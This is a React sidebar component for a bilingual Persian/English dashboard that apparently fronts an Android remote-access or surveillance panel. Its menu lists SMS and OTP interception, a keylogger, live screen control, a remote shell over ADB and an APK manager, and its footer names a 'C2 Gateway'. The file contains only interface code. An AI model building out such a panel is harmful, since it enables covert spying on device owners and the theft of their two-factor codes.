import React from 'react';
import { useDashboard } from '../context/DashboardContext';
import { TabType } from '../types';
import { 
  LayoutDashboard, 
  Smartphone, 
  ScreenShare, 
  MessageSquare, 
  Boxes, 
  FolderTree, 
  Keyboard, 
  Terminal, 
  ShieldAlert,
  Radio,
  Lock,
  Unlock,
  ShieldCheck,
  BatteryCharging
} from 'lucide-react';
import { t } from '../utils/translations';

interface NavItem {
  id: TabType;
  labelFa: string;
  labelEn: string;
  icon: React.ElementType;
  badge?: number | string;
}

export const Sidebar: React.FC = () => {
  const { 
    lang, 
    activeTab, 
    setActiveTab, 
    devices, 
    selectedDevice, 
    quarantineDevice,
    toggleScreenLock,
    smsList 
  } = useDashboard();

  const labels = t[lang];

  // Count unread or OTP messages
  const otpCount = smsList.filter(s => s.isOtp).length;
  const onlineCount = devices.filter(d => d.status === 'online').length;

  const navItems: NavItem[] = [
    { id: 'overview', labelFa: 'داشبورد و آمار کلی', labelEn: 'Overview & Metrics', icon: LayoutDashboard },
    { id: 'devices', labelFa: 'دستگاه‌های تحت پایش', labelEn: 'Monitored Devices', icon: Smartphone, badge: `${onlineCount}/${devices.length}` },
    { id: 'remote-screen', labelFa: 'صفحه زنده و کنترل', labelEn: 'Live Screen & Remote', icon: ScreenShare },
    { id: 'sms-calls', labelFa: 'پیامک‌ها و کدهای ۲FA', labelEn: 'SMS & OTP Intercept', icon: MessageSquare, badge: otpCount > 0 ? `${otpCount} OTP` : undefined },
    { id: 'apps-sandbox', labelFa: 'برنامه‌ها و بدافزار APK', labelEn: 'App Manager & APK', icon: Boxes },
    { id: 'file-manager', labelFa: 'مدیریت فایل و اسناد', labelEn: 'File Explorer', icon: FolderTree },
    { id: 'keylogger', labelFa: 'کی‌لاگر و اعلان‌ها', labelEn: 'Keylogger & Notifs', icon: Keyboard },
    { id: 'terminal', labelFa: 'شل و ترمینال ریموت', labelEn: 'Remote Shell & ADB', icon: Terminal },
    { id: 'threat-intel', labelFa: 'تحلیل بدافزار و YARA', labelEn: 'Threat Intel & YARA', icon: ShieldAlert }
  ];

  return (
    <aside className="w-64 bg-slate-950/70 border-e border-slate-800/80 flex flex-col shrink-0 h-[calc(100vh-4rem)] overflow-y-auto">
      {/* Target Device Quick Card */}
      {selectedDevice && (
        <div className="p-4 border-b border-slate-800/60 bg-slate-900/40">
          <div className="flex items-center justify-between text-xs text-slate-400 mb-1.5">
            <span className="font-medium text-slate-300">
              {lang === 'fa' ? 'دستگاه انتخاب‌شده' : 'Active Target'}
            </span>
            <div className="flex items-center gap-1">
              <span className={`w-2 h-2 rounded-full ${selectedDevice.status === 'online' ? 'bg-emerald-400 animate-pulse' : selectedDevice.status === 'quarantined' ? 'bg-amber-400' : 'bg-rose-500'}`} />
              <span className="font-mono text-[11px] capitalize">{selectedDevice.status}</span>
            </div>
          </div>

          <h4 className="text-sm font-semibold text-white truncate mb-1">
            {selectedDevice.name}
          </h4>

          <div className="flex items-center gap-2 text-[11px] text-slate-400 font-mono mb-2">
            <span>{selectedDevice.androidVersion}</span>
            <span aria-hidden="true">·</span>
            <span>{selectedDevice.carrier}</span>
            <span aria-hidden="true">·</span>
            <span className="flex items-center gap-0.5 text-slate-300">
              <BatteryCharging className="w-3 h-3 text-cyan-400" />
              {selectedDevice.battery}%
            </span>
          </div>

          {/* Quick controls on the active device */}
          <div className="grid grid-cols-2 gap-1.5 mt-2">
            <button
              onClick={() => toggleScreenLock(selectedDevice.id)}
              className="flex items-center justify-center gap-1 py-1 px-2 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-[11px] transition-colors cursor-pointer"
            >
              {selectedDevice.screenLocked ? (
                <>
                  <Unlock className="w-3 h-3 text-amber-400" />
                  <span>{lang === 'fa' ? 'بازکردن' : 'Unlock'}</span>
                </>
              ) : (
                <>
                  <Lock className="w-3 h-3 text-slate-400" />
                  <span>{lang === 'fa' ? 'قفل صفحه' : 'Lock'}</span>
                </>
              )}
            </button>

            <button
              onClick={() => quarantineDevice(selectedDevice.id)}
              className={`flex items-center justify-center gap-1 py-1 px-2 rounded text-[11px] font-medium transition-colors cursor-pointer ${
                selectedDevice.status === 'quarantined'
                  ? 'bg-emerald-950/60 border border-emerald-700/50 text-emerald-300 hover:bg-emerald-900/60'
                  : 'bg-rose-950/60 border border-rose-700/50 text-rose-300 hover:bg-rose-900/60'
              }`}
            >
              <ShieldCheck className="w-3 h-3" />
              <span>{selectedDevice.status === 'quarantined' ? (lang === 'fa' ? 'رفع قرنطینه' : 'Restore') : (lang === 'fa' ? 'قرنطینه' : 'Quarantine')}</span>
            </button>
          </div>
        </div>
      )}

      {/* Main Navigation Links */}
      <nav className="p-3 space-y-1 flex-1">
        <div className="text-[11px] uppercase tracking-wider text-slate-500 font-semibold px-3 py-1 mb-1">
          {lang === 'fa' ? 'ماژول‌های پنل' : 'System Modules'}
        </div>
        {navItems.map((item) => {
          const Icon = item.icon;
          const isActive = activeTab === item.id;
          return (
            <button
              key={item.id}
              onClick={() => setActiveTab(item.id)}
              className={`w-full flex items-center justify-between px-3 py-2 rounded-lg text-xs font-medium transition-all text-start cursor-pointer ${
                isActive
                  ? 'bg-cyan-500/10 text-cyan-300 border border-cyan-500/30'
                  : 'text-slate-400 hover:text-slate-200 hover:bg-slate-900/60'
              }`}
            >
              <div className="flex items-center gap-2.5 min-w-0">
                <Icon className={`w-4 h-4 shrink-0 ${isActive ? 'text-cyan-400' : 'text-slate-500'}`} />
                <span className="truncate">{lang === 'fa' ? item.labelFa : item.labelEn}</span>
              </div>
              {item.badge && (
                <span className="text-[10px] font-mono font-medium text-slate-400 bg-slate-800/80 px-1.5 py-0.5 rounded">
                  {item.badge}
                </span>
              )}
            </button>
          );
        })}
      </nav>

      {/* Footer information */}
      <div className="p-3 border-t border-slate-800/60 text-[11px] text-slate-500 flex items-center justify-between">
        <div className="flex items-center gap-1.5">
          <Radio className="w-3 h-3 text-cyan-400" />
          <span>C2 Gateway v2.4</span>
        </div>
        <span className="font-mono text-[10px] text-slate-400">TLS 1.3 / E2EE</span>
      </div>
    </aside>
  );
};
